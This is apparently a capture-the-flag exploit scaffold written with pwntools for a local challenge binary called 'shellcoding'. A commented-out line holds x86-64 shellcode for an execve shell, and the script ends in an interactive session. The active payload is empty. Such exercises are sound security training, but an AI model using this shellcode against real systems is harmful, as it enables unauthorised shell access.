from pwn import *

p = process('./shellcoding')
elf = ELF('./shellcoding')

#print hex(elf.search('/bin/sh').next())

print p.recv()
pause()
#p.send('\x48\xC7\xC7\xC0\x6C\x04\x10\x48\xC1\xEF\x06\xB0\x3B\x0F\x05')
p.send('')
p.interactive()

